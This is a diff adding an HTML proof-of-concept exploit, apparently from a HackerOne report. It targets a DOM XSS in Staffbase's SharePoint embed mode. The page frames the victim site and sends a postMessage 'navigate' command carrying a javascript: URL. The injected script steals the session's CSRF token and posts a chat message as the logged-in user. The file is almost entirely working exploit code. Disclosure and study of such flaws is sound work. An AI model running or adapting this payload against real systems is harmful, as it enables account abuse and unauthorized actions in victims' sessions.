@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Staffbase XSS PoC</title>
+</head>
+<body>
+    <h2>Staffbase DOM XSS: Integrity Violation (Chat Injection)</h2>
+    <div id="log">Status: Loading target...</div>
+    
+    <iframe id="victim" src="https://hackerone2.staffbase.rocks/content/news/dashboard?embedMode=sharepoint" width="100%" height="500"></iframe>
+
+    <script>
+        var frame = document.getElementById('victim');
+
+        window.addEventListener('message', function(e) {
+            try {
+                var data = JSON.parse(e.data);
+                
+                if (data.command === 'register') {
+                    document.getElementById('log').innerText = "Target Ready. Sending Payload...";
+                    console.info("[+] Target initialized. Origin: " + e.origin);
+                    
+                    setTimeout(executeXSS, 1000); 
+                }
+            } catch(err) {}
+        });
+
+        function executeXSS() {
+            var code = `(async()=>{try{var t=(await(await fetch('/auth/discover',{headers:{'Accept':'application/vnd.staffbase.auth.discovery.v2+json'}})).json()).csrfToken;await fetch('/api/installations/695f4cd124eb235aea87a3a4/conversations/direct/69611c0befab8f75c1e5ec49',{method:'POST',headers:{'content-type':'application/json','x-csrf-token':t},body:JSON.stringify({message:'H1 Triage: Integrity Violation PoC'})});alert('Integrity Violation Successful: Message sent using CSRF token '+t)}catch(e){alert('Error: '+e.message)}})()`;
+
+            var exploitMessage = {
+                command: "navigate",
+                url: "javascript:" + code
+            };
+
+            frame.contentWindow.postMessage(JSON.stringify(exploitMessage), '*');
+            document.getElementById('log').innerText = "Integrity Payload Sent. Check the victim chat.";
+        }
+    </script>
+</body>
+</html>
